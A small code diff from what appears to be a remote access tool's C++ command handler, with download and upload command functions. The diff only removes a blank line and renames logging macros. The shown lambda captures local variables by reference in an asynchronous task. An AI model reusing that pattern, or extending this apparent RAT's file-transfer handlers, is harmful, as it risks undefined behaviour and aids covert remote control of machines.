@@ -20,7 +20,6 @@ void Handler::handleDownloadCommand() {
     const size_t number_params = params.size();
     const std::string& url = params[0];
     this->short_process_pool->enqueue([this, &url, &params, &number_params] () {
-        
         std::lock_guard<std::mutex> curl_client_lock(this->curl_client_mutex);
         std::lock_guard<std::mutex> backing_bot_lock(this->backing_bot_mutex);
         switch (number_params) {
@@ -131,8 +130,8 @@ void Handler::handleUploadCommand() {
 }
 
 } // namespace rat::Handler
-#undef DEBUG_LOG
-#undef ERROR_LOG
+#undef HANDLER_DEBUG_LOG
+#undef HANDLER_ERROR_LOG
 #ifdef DEBUG_RAT_HANDLER
     #undef DEBUG_RAT_HANDLER
 #endif
